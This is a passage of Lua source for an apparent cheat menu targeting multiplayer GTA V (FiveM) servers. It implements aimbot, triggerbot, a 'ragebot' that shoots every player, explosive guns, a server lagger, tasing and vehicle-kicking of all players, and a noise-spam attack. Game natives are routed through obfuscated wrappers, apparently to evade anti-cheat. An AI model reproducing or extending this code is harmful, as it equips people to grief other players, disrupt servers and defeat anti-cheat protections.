                       Fatasf.n.RequestNamedPtfxAsset("core")
                       Fatasf.n.UseParticleFxAsset("core")
                       Fatasf.n.StartNetworkedParticleFxNonLoopedAtCoord( "exp_air_molotov", pedcoords, 0.0, 0.0, 0.0, 10.0, false, false, false, false)
                   
                       Fatasf.n.RequestNamedPtfxAsset("scr_rcbarry1")
                       Fatasf.n.UseParticleFxAsset("scr_rcbarry1")
                       Fatasf.n.StartNetworkedParticleFxNonLoopedAtCoord( "scr_alien_teleport", pedcoords, 0.0, 0.0, 0.0, 10.0, false, false, false, false)
                   end	
           
                   if Cock.Menu.Spectate2 then
                       local oldcoords = Fatasf.n.GetEntityCoords(Fatasf.n.PlayerPedId())
                       local Player = Fatasf.n.PlayerPedId()
                       --oldcoords
                       local ped = Fatasf.n.ClonePed(Player, true, false, false)
                       while Cock.Menu.Spectate2 do
                           CockT.Inv["Wait"](0)
                           local TargetCoords = Fatasf.n.GetEntityCoords(Fatasf.n.GetPlayerPed(CockT.Global.SelectedPlayer))
                           Fatasf.n.SetEntityVisible(Player, false, false)
                           CockT.Inv["Invoke"](CockT.Natives['SetEntityAlpha'], Player, 0)
                           Fatasf.n.SetEntityCoordsNoOffset(Player, TargetCoords.x, TargetCoords.y, TargetCoords.z+2.2, true, true, true)
                           if not Cock.Menu.Spectate2 then
                               Fatasf.n.SetEntityCoordsNoOffset(Player, oldcoords.x, oldcoords.y, oldcoords.z, true, true, true)
                               Fatasf.n.SetEntityVisible(Player, true, true)
                               CockT.Inv["Invoke"](CockT.Natives['ResetEntityAlpha'], Player)
                               Fatasf.n.DeleteEntity(ped)
                           end
                       end
                   end
   
                   
           
                   if Cock.Menu.DisableAllEnginesLoop then
                       Functions.f.DisableAllEngines()
                   end  
           
                   if Cock.Menu.lagserver then
                       CockT.Global.ServerLagger()
                   end
                   if Cock.Menu.tazeloopall then
                       CockT.Global.TazePlayer(Fatasf.n.GetPlayerPed(i))
                   end
                   if Cock.Menu.kickfromvehall then
                       Fatasf.n.ClearPedTasksImmediately(Fatasf.n.GetPlayerPed(i))
                   end
                   if Cock.Menu.earrapeall then
                       CockT.Global.EarRape()
                   end
   
   
                   if Cock.Menu.fov then
                       Fatasf.n.RequestStreamedTextureDict("mpmissmarkers256", true)
                       Fatasf.n.DrawSprite("mpmissmarkers256","corona_shade",0.5,0.5, Cock.Sliders['AimFov'].value / 10 / 150, Cock.Sliders['AimFov'].value / 10 / 150 * 1.8,0.0,90,90,90,90)
                   end
                   if Cock.Menu.triggerbot then
                       local hasTarget, target = Fatasf.n.GetEntityPlayerIsFreeAimingAt(Fatasf.n.PlayerId())
                       if hasTarget and Fatasf.n.IsPedAPlayer(target) then
                           local x, y, z = CockT.Strings.tunpack(Fatasf.n.GetPedBoneCoords(target, 0, 0.0, -0.2, 0.0))
                           Fatasf.n.SetPedShootsAtCoord(Fatasf.n.PlayerPedId(), x, y, z, true)
                       end
                   end
                   if Cock.Menu.Carkiller then
                       for k, v in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do 
                           local pPed = Fatasf.n.GetPlayerPed(v)
                           local Rotation = Fatasf.n.GetEntityRotation(k)
                           local Direct = CockMeni.Functions.RotationToDirection(Rotation)
                           local TargetCoords = Fatasf.n.GetPedBoneCoords(k, 31086, 0, 0, 0)
                           local IsPedAlive = Fatasf.n.IsEntityDead(k)
                           local playerInVeh = Fatasf.n.IsPedInAnyVehicle(Fatasf.n.PlayerPedId(), 0)
                           if playerInVeh then
                           if not IsPedAlive and not Cock.AimFriends[Fatasf.n.GetPlayerName(v)] then
                           Fatasf.n.ShootSingleBulletBetweenCoords( (TargetCoords.x + Direct.x), (TargetCoords.y + Direct.y), (TargetCoords.z + Direct.z), TargetCoords.x, TargetCoords.y, TargetCoords.z, 50.0, false,Fatasf.n.GetHashKey('WEAPON_PISTOL'),Fatasf.n.PlayerPedId(), true, true, 1000.0)
                           CockT.Inv["Wait"](10)
                           else
                           end
                       else
                       end
                       end
                   end
                   if Cock.Menu.Aimbot then
                       for k, v in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do 
                           local pPed = Fatasf.n.GetPlayerPed(v)
                           local red = 255
                           local green = 255
                           local blue = 255
                           
           
                           if not Cock.AimFriends[Fatasf.n.GetPlayerName(v)] then 
                               local coords = Fatasf.n.GetEntityCoords(pPed, false)
                               local mycoords = Fatasf.n.GetEntityCoords(Fatasf.n.PlayerPedId(), false)
                               local distace = Fatasf.n.GetDistanceBetweenCoords(mycoords.x, mycoords.y, mycoords.z, coords.x, coords.y, coords.z, false)
                               local Rotation = Fatasf.n.GetEntityRotation(pPed)
                               local Direct = CockMeni.Functions.RotationToDirection(Rotation)
                               local fovx = Cock.Sliders['AimFov'].value
                               local ecnatsid = Cock.Sliders['AimDist'].value
                               local _, x_world, y_world = Fatasf.n.GetScreenCoordFromWorldCoord(coords.x, coords.y, coords.z)
                               local x_screen, y_screen = Fatasf.n.GetActiveScreenResolution()
                               local Radius = Functions.f.TranslateFOVInNumber(fovx)
                               local IsInCFOV = Functions.f.IsInCFOVCircleFOV(x_screen / 2, y_screen / 2, Radius, x_world * x_screen, y_world * y_screen)
                               if distace < ecnatsid then
                                   if Fatasf.n.IsDisabledControlPressed(0, CockT.Keys["LEFTALT"]) then
                                       local TargetCoords = Fatasf.n.GetPedBoneCoords(pPed, 31086, 0, 0, 0)
                                       local IsPedAlive = Fatasf.n.IsEntityDead(pPed)
                                       if not IsPedAlive then
                                           if VisibleCheck then
                                               if Fatasf.n.HasEntityClearLosToEntity(Fatasf.n.PlayerPedId(), pPed, 17) then
                                                   if IsInCFOV then
                                                       if Cock.Menu.targets then
                                                           Fatasf.n.DrawLine(mycoords.x, mycoords.y, mycoords.z, coords.x, coords.y, coords.z, red, green, blue, 255)
                                                           CockT.Global.DrawTextOnCoords(coords.x, coords.y, coords.z, 'Targeting', red, green, blue, 0, 0.20)
                                                           if Fatasf.n.IsPedShooting(Fatasf.n.PlayerPedId()) then
                                                               Fatasf.n.SetPedShootsAtCoord(Fatasf.n.PlayerPedId(), (TargetCoords.x + Direct.x), (TargetCoords.y + Direct.y), (TargetCoords.z + Direct.z), true)
                                                               --Fatasf.n.ShootSingleBulletBetweenCoords( (TargetCoords.x + Direct.x), (TargetCoords.y + Direct.y), (TargetCoords.z + Direct.z), TargetCoords.x, TargetCoords.y, TargetCoords.z, 0.1, false, Fatasf.n.GetSelectedPedWeapon(Fatasf.n.PlayerPedId()),Fatasf.n.PlayerPedId(), true, true, 1.0)
                                                           CockT.Inv["Wait"](10)
                                                       end
                                                       else
                                                           if Fatasf.n.IsPedShooting(Fatasf.n.PlayerPedId()) then
                                                               Fatasf.n.SetPedShootsAtCoord(Fatasf.n.PlayerPedId(), (TargetCoords.x + Direct.x), (TargetCoords.y + Direct.y), (TargetCoords.z + Direct.z), true)
                                                               --Fatasf.n.ShootSingleBulletBetweenCoords( (TargetCoords.x + Direct.x), (TargetCoords.y + Direct.y), (TargetCoords.z + Direct.z), TargetCoords.x, TargetCoords.y, TargetCoords.z, 0.1, false, Fatasf.n.GetSelectedPedWeapon(Fatasf.n.PlayerPedId()),Fatasf.n.PlayerPedId(), true, true, 1.0)
                                                           CockT.Inv["Wait"](10)
                                                       end
                                                       end 
                                                   end
                                               end
                                           else
                                               if IsInCFOV then
                                                   if Cock.Menu.targets then
                                                       Fatasf.n.DrawLine(mycoords.x, mycoords.y, mycoords.z, coords.x, coords.y, coords.z, red, green, blue, 255)
                                                       CockT.Global.DrawTextOnCoords(coords.x, coords.y, coords.z, 'Targeting', red, green, blue, 0, 0.20)
                                                       if Fatasf.n.IsPedShooting(Fatasf.n.PlayerPedId()) then
                                                       Fatasf.n.ShootSingleBulletBetweenCoords( (TargetCoords.x + Direct.x), (TargetCoords.y + Direct.y), (TargetCoords.z + Direct.z), TargetCoords.x, TargetCoords.y, TargetCoords.z, 0.1, false, Fatasf.n.GetSelectedPedWeapon(Fatasf.n.PlayerPedId()),Fatasf.n.PlayerPedId(), true, true, 1.0)
                                                       CockT.Inv["Wait"](10)
                                                   end
                                                   else
                                                       if Fatasf.n.IsPedShooting(Fatasf.n.PlayerPedId()) then
                                                       Fatasf.n.ShootSingleBulletBetweenCoords( (TargetCoords.x + Direct.x), (TargetCoords.y + Direct.y), (TargetCoords.z + Direct.z), TargetCoords.x, TargetCoords.y, TargetCoords.z, 0.1, false, Fatasf.n.GetSelectedPedWeapon(Fatasf.n.PlayerPedId()),Fatasf.n.PlayerPedId(), true, true, 1.0)
                                                       CockT.Inv["Wait"](10)
                                                   end
                                                   end
                                               end
                                           end
                                       end
                                   end
                               end
                           end
                       end
                   end	
           
       
           
                   if Cock.Menu.ragebot then
                       for k, v in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do
                           local pPed = Fatasf.n.GetPlayerPed(v)
                           local Rotation = Fatasf.n.GetEntityRotation(pPed)
                           local Direct = CockMeni.Functions.RotationToDirection(Rotation)
                           local TargetCoords = Fatasf.n.GetPedBoneCoords(pPed, 31086, 0, 0, 0)
                           local IsPedAlive = Fatasf.n.IsEntityDead(pPed)
                           if not IsPedAlive and not Cock.AimFriends[Fatasf.n.GetPlayerName(v)] then
                               Fatasf.n.ShootSingleBulletBetweenCoords( (TargetCoords.x + Direct.x), (TargetCoords.y + Direct.y), (TargetCoords.z + Direct.z), TargetCoords.x, TargetCoords.y, TargetCoords.z, 1150.0, false,Fatasf.n.GetHashKey('WEAPON_PISTOL'),Fatasf.n.PlayerPedId(), true, true, 1000.0)
                               CockT.Inv["Wait"](0)
                           end
                       end
                   else
                   end
           
                   if Cock.Menu.molotovgun then
                       local ret, position = Fatasf.n.GetPedLastWeaponImpactCoord(Fatasf.n.PlayerPedId()) 
                       if ret then 
                           Fatasf.n.AddExplosion(position.x, position.y, position.z, 3, 100.0, true, false, 1.0) 
                       end
                   end
                   if Cock.Menu.Tpgun then
                       local ret, position = Fatasf.n.GetPedLastWeaponImpactCoord(Fatasf.n.PlayerPedId()) 
                       if ret then 
                           Fatasf.n.SetEntityCoordsNoOffset(Fatasf.n.PlayerPedId(), position.x, position.y, position.z+1.0, true, true, true)
                           CockT.Inv["Wait"](0)
                       end
                   end
                   if Cock.Menu.RPGGun then
                       local ret, position = Fatasf.n.GetPedLastWeaponImpactCoord(Fatasf.n.PlayerPedId()) 
                       if ret then 
                           Fatasf.n.ShootSingleBulletBetweenCoords( position.x, position.y, position.z, position.x, position.y, position.z, 50.0, false, Fatasf.n.GetHashKey('WEAPON_RPG'), Fatasf.n.PlayerPedId(), true, true, 1.0)
                       end
                   end
                   if Cock.Menu.rapidfire then
                       CockT.Inv["Invoke"](CockT.Natives['DisablePlayerFiring'], Fatasf.n.PlayerPedId(), true)
                       if Fatasf.n.IsDisabledControlPressed(0, 257) and Fatasf.n.IsPlayerFreeAiming(Fatasf.n.PlayerId()) then
                           local _, weapon = Fatasf.n.GetCurrentPedWeapon(Fatasf.n.PlayerPedId())
                           local wepent = Fatasf.n.GetCurrentPedWeaponEntityIndex(Fatasf.n.PlayerPedId())
                           local launchPos = Fatasf.n.GetEntityCoords(wepent)
                           local targetPos = Fatasf.n.GetGameplayCamCoord() + (CockMeni.Functions.RotationToDirection(Fatasf.n.GetGameplayCamRot(2)) * 200.0)
                       
                           Fatasf.n.ShootSingleBulletBetweenCoords( launchPos, targetPos, 5, 1, weapon, Fatasf.n.PlayerPedId(), true, true, 24000.0)
                           Fatasf.n.ShootSingleBulletBetweenCoords( launchPos, targetPos, 5, 1, weapon, Fatasf.n.PlayerPedId(), true, true, 24000.0)
                       end
                   end
                   if Cock.Menu.infammo then
                       CockT.Inv["Invoke"](CockT.Natives['SetPedInfiniteAmmoClip'], Fatasf.n.PlayerPedId(), true)
                   else
                       CockT.Inv["Invoke"](CockT.Natives['SetPedInfiniteAmmoClip'], Fatasf.n.PlayerPedId(), false)
                   end
   
                   if Cock.Menu.shootvehs then
                       local player = Fatasf.n.PlayerPedId()
                       local _, position = Fatasf.n.GetPedLastWeaponImpactCoord(player) 
                       local vehicles = {"adder", "banshee", "bus", "freecrawler", "akuma", "banshee",}
                       if _ then
                           local randomvehs = vehicles[CockT.Math.random(#vehicles)]
                           
                           if not Fatasf.n.HasModelLoaded(Fatasf.n.GetHashKey(randomvehs)) then
                               Fatasf.n.RequestModel(Fatasf.n.GetHashKey(randomvehs))
                           end	
                           local veh = Fatasf.n.CreateVehicle(Fatasf.n.GetHashKey(randomvehs), position.x, position.y, position.z , 1, 1, 1)
                           local rotation = Fatasf.n.GetEntityRotation(player)
                           Fatasf.n.SetVehicleEngineOn(veh, true, true, true)
                           Fatasf.n.SetEntityRotation(veh, rotation, 0.0, 0.0, 0.0, true)
                           Fatasf.n.SetVehicleForwardSpeed(veh, 500.0)
                       end
                   end
                   if Cock.Menu.particlegun then
                       local currentparticle = Cock.Menu.ParticleModes[Cock.Menu.CurrentParticle]	
                       
                       Functions.f.DrawTextTest(currentparticle, false, 0.35, 0, 0.5, 0.957)
           
                       if Fatasf.n.IsDisabledControlJustPressed(1, CockT.Keys["RIGHT"]) then
                           Cock.Menu.CurrentParticle = Cock.Menu.CurrentParticle + 1
                           if Cock.Menu.CurrentParticle > #Cock.Menu.ParticleModes then
                               Cock.Menu.CurrentParticle = 1
                           end
                       end
                       if Fatasf.n.IsDisabledControlJustPressed(1, CockT.Keys["LEFT"]) then
                           Cock.Menu.CurrentParticle = Cock.Menu.CurrentParticle - 1
                           if Cock.Menu.CurrentParticle < 1 then
                               Cock.Menu.CurrentParticle = #Cock.Menu.ParticleModes
                           end
                       end
                       
           
                           if currentparticle == 'Blood' then
                               if Fatasf.n.IsPedArmed(Fatasf.n.PlayerPedId(), 7) and Fatasf.n.IsPedArmed(Fatasf.n.PlayerPedId(), 6) then
                                   CockT.Inv['Thread'](function() local Z, b2 = Fatasf.n.GetPedLastWeaponImpactCoord(Fatasf.n.PlayerPedId()) if Z then
                                       local ef = {
                                           {"core", "blood_stab"},
                                           {"core", "td_blood_shotgun"}
                                       }
                                       for eg, eh in CockT.Math.pairs(ef) do if eh then if eh[1] and eh[2] then while not Fatasf.n.HasNamedPtfxAssetLoaded(eh[1]) do CockT.Inv["Wait"](0) Fatasf.n.RequestNamedPtfxAsset(eh[1]) end Fatasf.n.UseParticleFxAsset( eh[1]) Fatasf.n.StartNetworkedParticleFxNonLoopedAtCoord( eh[2],b2 + vec3(0.0, 0.0, 3.5),0.0,180.0,0.0,20.0,false,false,false,false) end end end end end) end 
                           end
                           if currentparticle == 'Smoke' then
                               if Fatasf.n.IsPedArmed(Fatasf.n.PlayerPedId(), 7) and Fatasf.n.IsPedArmed(Fatasf.n.PlayerPedId(), 6) then
                                   CockT.Inv['Thread'](function() local Z, b2 = Fatasf.n.GetPedLastWeaponImpactCoord(Fatasf.n.PlayerPedId()) if Z then
                                       local ef = {
                                           {"scr_tplaces", "scr_tplaces_team_swap_nocash"},
                                       }
                                       for eg, eh in CockT.Math.pairs(ef) do if eh then if eh[1] and eh[2] then while not Fatasf.n.HasNamedPtfxAssetLoaded(eh[1]) do CockT.Inv["Wait"](0) Fatasf.n.RequestNamedPtfxAsset(eh[1]) end Fatasf.n.UseParticleFxAsset( eh[1]) Fatasf.n.StartNetworkedParticleFxNonLoopedAtCoord( eh[2],b2 + vec3(0.0, 0.0, 3.5),0.0,180.0,0.0,20.0,false,false,false,false) end end end end end) end 
                           end
                           if currentparticle == 'Fireworks' then
                               if Fatasf.n.IsPedArmed(Fatasf.n.PlayerPedId(), 7) and Fatasf.n.IsPedArmed(Fatasf.n.PlayerPedId(), 6) then
                                   CockT.Inv['Thread'](function()
                                           local Z, b2 = Fatasf.n.GetPedLastWeaponImpactCoord(Fatasf.n.PlayerPedId())
                                           if Z then
                                               local ef = {
                                                   {"proj_indep_firework", "scr_indep_launcher_sparkle_spawn"},
                                                   {"proj_indep_firework_v2", "scr_xmas_firework_burst_fizzle"},
                                                   {"proj_indep_firework_v2", "scr_firework_indep_burst_rwb"},
                                                   {"proj_xmas_firework", "scr_firework_xmas_ring_burst_rgw"}
                                               }
                                               for eg, eh in CockT.Math.pairs(ef) do
                                                   if eh then
                                                       if eh[1] and eh[2] then
                                                           while not Fatasf.n.HasNamedPtfxAssetLoaded(eh[1]) do
                                                               CockT.Inv["Wait"](0)
                                                               Fatasf.n.RequestNamedPtfxAsset(eh[1])
                                                           end
                                                           Fatasf.n.UseParticleFxAsset( eh[1])
                                                           Fatasf.n.StartNetworkedParticleFxNonLoopedAtCoord( eh[2],b2 + vec3(0.0, 0.0, 3.5),0.0,180.0,0.0,20.0,false,false,false,false)
                                               end end end end end) end 
                                       end
                           if currentparticle == 'Cartoon' then
                               CockT.Inv['Thread'](function() local Z, b2 = Fatasf.n.GetPedLastWeaponImpactCoord(Fatasf.n.PlayerPedId()) if Z then
                                   local ef = {
                                       {"scr_rcbarry2", "muz_clown"},
                                   }
                                   for eg, eh in CockT.Math.pairs(ef) do if eh then if eh[1] and eh[2] then while not Fatasf.n.HasNamedPtfxAssetLoaded(eh[1]) do CockT.Inv["Wait"](0) Fatasf.n.RequestNamedPtfxAsset(eh[1]) end Fatasf.n.UseParticleFxAsset( eh[1]) Fatasf.n.StartNetworkedParticleFxNonLoopedAtCoord( eh[2],b2 + vec3(0.0, 0.0, 3.5),0.0,180.0,0.0,20.0,false,false,false,false) end end end end end)
                           end
                           if currentparticle == 'Explode' then
                               CockT.Inv['Thread'](function() local Z, b2 = Fatasf.n.GetPedLastWeaponImpactCoord(Fatasf.n.PlayerPedId()) if Z then
                                   local ef = {
                                       {"scr_trevor3", "scr_trev3_c4_explosion"},
                                       {"cut_finale1", "cs_finale1_car_explosion"}
                                   }
                                   for eg, eh in CockT.Math.pairs(ef) do if eh then if eh[1] and eh[2] then while not Fatasf.n.HasNamedPtfxAssetLoaded(eh[1]) do CockT.Inv["Wait"](0) Fatasf.n.RequestNamedPtfxAsset(eh[1]) end Fatasf.n.UseParticleFxAsset( eh[1]) Fatasf.n.StartNetworkedParticleFxNonLoopedAtCoord( eh[2],b2 + vec3(0.0, 0.0, 3.5),0.0,180.0,0.0,20.0,false,false,false,false) end end end end end)
                           end
                   end
           
                   if Cock.Menu.cvcolour then
                       local vehicle = Fatasf.n.GetVehiclePedIsUsing(Fatasf.n.PlayerPedId())
                       CockMeni.Functions.RGBPicker(CockT.RGBPicker['MyCar'])
                       CockT.Inv["Invoke"](CockT.Natives['SetVehicleCustomPrimaryColour'], vehicle, Rv2, Gv2, Bv2)
                       CockT.Inv["Invoke"](CockT.Natives['SetVehicleCustomSecondaryColour'], vehicle, Rv2, Gv2, Bv2)
                   end
           
                   if Cock.Menu.paintallvehs then
                       CockMeni.Functions.RGBPicker(CockT.RGBPicker['AllVehicles'])
                       for vehs in Fatasf.n.EnumerateVehicles() do
                           --Fatasf.n.RequestControlOnce(vehs)
                           CockT.Inv["Invoke"](CockT.Natives['SetVehicleCustomPrimaryColour'], vehs, CockT.RGBPicker['AllVehicles'].red, CockT.RGBPicker['AllVehicles'].green, CockT.RGBPicker['AllVehicles'].blue)
                           CockT.Inv["Invoke"](CockT.Natives['SetVehicleCustomSecondaryColour'], vehs, CockT.RGBPicker['AllVehicles'].red, CockT.RGBPicker['AllVehicles'].green, CockT.RGBPicker['AllVehicles'].blue)
                       end
                   end
                   
                   if Cock.Menu.hitsound then
                       local hasTarget, target = Fatasf.n.GetEntityPlayerIsFreeAimingAt(Fatasf.n.PlayerId())
                       if hasTarget and Fatasf.n.IsPedShooting(Fatasf.n.PlayerPedId()) and Fatasf.n.IsEntityAPed(target) and not Fatasf.n.IsEntityDead(target) then
                           --local hitsound = Fatasf.n.CreateAnDui("https://cock.menu/music/hitsound.mp3", 50, 50)
                           --Fatasf.n.DestroyDui(hitsound)
                           Fatasf.n.PlaySoundFrontend(-1, "PROPERTY_PURCHASE", "HUD_AWARDS", true)
                       end
                   end
   
                   if Cock.Menu.hitmarker then
                       local hasTarget, target = Fatasf.n.GetEntityPlayerIsFreeAimingAt(Fatasf.n.PlayerId())
                       if hasTarget and Fatasf.n.IsPedShooting(Fatasf.n.PlayerPedId()) and Fatasf.n.IsEntityAPed(target)  then
                           Fatasf.n.RequestStreamedTextureDict('helicopterhud', true)
                           for asdi = 0, 25 do
                               CockT.Inv["Wait"](0)
                               Fatasf.n.DrawSprite('helicopterhud', 'hud_lock',  0.5, 0.5, 0.023, 0.04, 45.0, 255, 255, 255, 255)
                           end
                       end
                   end
           
                   if Cock.Menu.customhud then
                       CockMeni.Functions.RGBPicker(CockT.RGBPicker['CustomHud'])
                       CockT.Inv["Invoke"](CockT.Natives['ReplaceHudColourWithRgba'], 116, CockT.RGBPicker['CustomHud'].red, CockT.RGBPicker['CustomHud'].green, CockT.RGBPicker['CustomHud'].blue, 255)
                   end
           
                   if Cock.Menu.tracers then
                       for k, v in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do 
                           local pPed = Fatasf.n.GetPlayerPed(v)
                           local _self = Fatasf.n.PlayerPedId()
                           local xx, yy, zz = CockT.Strings.tunpack(Functions.f.GetPedBoneCoords(pPed, 0, 0.0, 0.0, 0.0))
                           local x, y, z = CockT.Strings.tunpack(Functions.f.GetPedBoneCoords(_self, bone, 0.0, 0.0, 0.0))
                           if Fatasf.n.GetDistanceBetweenCoords(Fatasf.n.GetEntityCoords(pPed), Fatasf.n.GetEntityCoords(Fatasf.n.PlayerPedId()), true) < Cock.Sliders['EspDistance'].value+0.0 then
                               Fatasf.n.DrawLine(xx, yy, zz, x, y, z, 255, 255, 255, 255)
                           end
                       end
                   end
           
                   if Cock.Menu.udwallslock then
                       local hasTarget, target = Fatasf.n.GetEntityPlayerIsFreeAimingAt(Fatasf.n.PlayerId())
                       if hasTarget and Fatasf.n.IsPedShooting(Fatasf.n.PlayerPedId()) and Fatasf.n.IsEntityAPed(target) and not Fatasf.n.IsEntityDead(target) then
                           local coords = Fatasf.n.GetPedBoneCoords(target, CockMenu.ComboBoxesT.Bone[CockMenu.ComboBoxesT.HeadMultIndex], 0.0, 0.0, 0.0)
                           Fatasf.n.ShootSingleBulletBetweenCoords(coords.x, coords.y - 0.2, coords.z, coords.x, coords.y, coords.z, 0.1, true, Fatasf.n.GetSelectedPedWeapon(Fatasf.n.PlayerPedId()), Fatasf.n.PlayerPedId(), true, true, 1.0)
                       end
                   end
                   
   
                   if Cock.Menu.Aimlock then
                           for k, v in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do 
                           --for pPed in Fatasf.n.EnumeratePeds() do 
                           local pPed = Fatasf.n.GetPlayerPed(v)
                           if not Cock.AimFriends[Fatasf.n.GetPlayerName(v)] then 
                               if CockT.Inv["Invoke"](CockT.Natives['IsAimCamActive']) and Fatasf.n.IsEntityOnScreen(pPed) and Fatasf.n.HasEntityClearLosToEntity(pPed, Fatasf.n.PlayerPedId(), 17) then
                                   local coords = Fatasf.n.GetPedBoneCoords(pPed, 31086, 0.0, 0.0, 0.0) --Fatasf.n.GetEntityCoords(k, false)
                                   local _, x_world, y_world = Fatasf.n.GetScreenCoordFromWorldCoord(coords.x, coords.y, coords.z)
                                   local x_screen, y_screen = Fatasf.n.GetActiveScreenResolution() 
                                   local fovxy = Cock.Sliders['AimFov'].value
                                   local Radius = Functions.f.TranslateFOVInNumber(fovxy)
                                   local IsInCFOV = Functions.f.IsInCFOVCircleFOV(x_screen / 2, y_screen / 2, Radius, x_world * x_screen, y_world * y_screen)
               
                                   if IsInCFOV and Fatasf.n.GetEntityHealth(pPed) > 1 then
                                       local TRot = CockMeni.Functions.GetRotation(coords - Fatasf.n.GetGameplayCamCoord())
                                       local PRot = CockMeni.Functions.PedRotation(Fatasf.n.PlayerPedId(), 2)
                                       local _x = TRot.z - PRot.z
                                       local _y = TRot.x 
                                       local nx = Functions.f.Lerp(Cock.Sliders['AimSmooth'].value, 0.001, TRot.z - PRot.z)
                                       Fatasf.n.SetGameplayCamRelativeRotation(nx, TRot.x, 1.0)
                                       if Cock.Menu.targets then
                                           local dist = Fatasf.n.GetDistanceBetweenCoords(Fatasf.n.GetFinalRenderedCamCoord(), Fatasf.n.GetEntityCoords(pPed), true)
                                           Fatasf.n.SetDrawOrigin(coords.x, coords.y, coords.z, 0)
                                           Fatasf.n.DrawSprite("helicopterhud", "hud_corner", -0.01 / dist * 4, -0.015 / dist * 4, 0.013, 0.013, 0.0, 255, 0, 0, 200)
                                           Fatasf.n.DrawSprite("helicopterhud", "hud_corner", 0.01 / dist * 4, -0.015 / dist * 4, 0.013, 0.013, 90.0, 255, 0, 0, 200)
                                           Fatasf.n.DrawSprite("helicopterhud", "hud_corner", -0.01 / dist * 4, 0.015 / dist * 4, 0.013, 0.013, 270.0, 255, 0, 0, 200)
                                           Fatasf.n.DrawSprite("helicopterhud", "hud_corner", 0.01 / dist * 4, 0.015 / dist * 4, 0.013, 0.013, 180.0, 255, 0, 0, 200)
                                           Fatasf.n.ClearDrawOrigin()
                                           Fatasf.n.DrawLine(Fatasf.n.GetEntityCoords(Fatasf.n.PlayerPedId(), false), Fatasf.n.GetEntityCoords(pPed, false), red, green, blue, 255)
                                       end
                                   end
                                   end
                               end
                           end
                       end
           
                       --[[if Cock.Menu.beliketorch then
                           local Particles = {{"scr_rcbarry2", "scr_exp_clown"}}
                           
                           local ped = Fatasf.n.PlayerPedId()
                           local coords = Fatasf.n.GetPedBoneCoords(ped, 31086, 0.0, 0.0, 0.0)--Fatasf.n.GetEntityCoords(Fatasf.n.PlayerPedId(), false)
                           local Rot = CockMeni.Functions.PedRotation(ped, 2)
                           CockT.Inv['Thread'](function()
                               for part, clown in CockT.Math.pairs(Particles) do
                                   Fatasf.n.RequestNamedPtfxAsset(clown[1])
                                   Fatasf.n.UseParticleFxAsset(clown[1])
                                   Fatasf.n.StartNetworkedParticleFxNonLoopedAtCoord(clown[2], coords.x, coords.y, coords.z, 0.0, 20.0, false, false, false, false)
                               end
                           end)
                       end]]
   
                       if Cock.Menu.tinyplayer then
                           Fatasf.n.SetPedConfigFlag(Fatasf.n.PlayerPedId(), 223, true)
                       else
                           Fatasf.n.SetPedConfigFlag(Fatasf.n.PlayerPedId(), 223, false)
                       end
   
                       if Cock.Menu.Slowmotion then
                           CockT.Inv["Invoke"](CockT.Natives['SetTimeScale'], 0.35)
                       else
                           CockT.Inv["Invoke"](CockT.Natives['SetTimeScale'], 1.0)
                       end
   
                       if Cock.Menu.force3rdper then
                           Fatasf.n.SetFollowPedCamViewMode(0)
                           CockT.Inv["Invoke"](CockT.Natives['SetFollowVehicleCamViewMode'], 0)
                           CockT.Inv["Invoke"](CockT.Natives['DisableFirstPersonCamThisFrame'])
                       end
                       
                       if Cock.Menu.forcedriveby then
                           CockT.Inv["Invoke"](CockT.Natives['SetPlayerCanDoDriveBy'], Fatasf.n.PlayerPedId(), true)
                       end
   
                       if Cock.Menu.rainbowworld then
                           local coords = Fatasf.n.GetPedBoneCoords(Fatasf.n.PlayerPedId(), 0x796E, 0.0, 0.0, 0.0)
                           local rgb = Functions.f.RGBRainbow(1.0)
                           CockT.Inv["Invoke"](CockT.Natives['DrawLightWithRangeAndShadow'], coords.x, coords.y, coords.z + 3.0, rgb.r, rgb.g, rgb.b, 1000.0, 80.0)
                       end
           
                       if Cock.Menu.sexanimation then
                           local target = Fatasf.n.PlayerPedId()
                           Fatasf.n.ClearPedTasks(Fatasf.n.GetPlayerPed(target))
                           Fatasf.n.TaskPlayAnim(target, "rcmpaparazzo_2", "shag_loop_a", 2.0, 2.5, -1, 49, 0, 0, 0, 0)
                           Fatasf.n.SetPedKeepTask(target)
                       else
                       end
   
                       if Cock.Menu.CustomDamage then
                           CockT.Inv["Invoke"](CockT.Natives['SetPlayerWeaponDamageModifier'], Fatasf.n.PlayerId(), Cock.Sliders['CustomDamage'].value+0.0)
                           CockT.Inv["Invoke"](CockT.Natives['SetPlayerMeleeWeaponDamageModifier'], Fatasf.n.PlayerId(), Cock.Sliders['CustomDamage'].value+0.0)
                       else
                           CockT.Inv["Invoke"](CockT.Natives['SetPlayerWeaponDamageModifier'], Fatasf.n.PlayerId(), 1.0)
                           CockT.Inv["Invoke"](CockT.Natives['SetPlayerMeleeWeaponDamageModifier'], Fatasf.n.PlayerId(), 1.0)
                       end
           
                       if Cock.Menu.friendslist and CockT.display_menu and tab == "Aimbot" then
                           Cock.Menu.plist = true
                           local drag_x2 = Cock.Menu.MenuX2-0.5
                           local drag_y2 = Cock.Menu.MenuY2-0.5
                           Fatasf.n.DrawRect(0.33+drag_x2, 0.43+drag_y2, 0.1, 0.35, 0, 0, 0, 180)
                           
                           if CockMenu.Main.FriendsButton(Fatasf.n.GetPlayerServerId(player)..' | '..Fatasf.n.GetPlayerName(player), Fatasf.n.GetPlayerName(player), 0.33, 0.259) then
                               Cock.AimFriends[Fatasf.n.GetPlayerName(CockT.Global.SelectedPlayer)] = not Cock.AimFriends[Fatasf.n.GetPlayerName(CockT.Global.SelectedPlayer)]
                           end
                       end
   
                       if Cock.Menu.plist and CockT.display_menu then
                           drag_x2 = Cock.Menu.MenuX2-0.5
                           drag_y2 = Cock.Menu.MenuY2-0.5
                           Fatasf.n.DrawRect(0.65+drag_x2, 0.475+drag_y2, 0.1, 0.45, 0, 0, 0, 180)
           
                           
                           if CockT.Global.Zones(0.65+drag_x2, 0.475+drag_y2, 0.1, 0.45) then
                               if Fatasf.n.IsDisabledControlJustPressed(0, 15)  then
                                   CockMeni.Functions.stscr = CockMeni.Functions.stscr - 0.016
                               end
                       
                               if Fatasf.n.IsDisabledControlJustPressed(0, 14) then
                                   CockMeni.Functions.stscr = CockMeni.Functions.stscr + 0.016
                               end
                           end
   
                           local ids = Fatasf.n.GetActivePlayers()
                           local y = 0.38
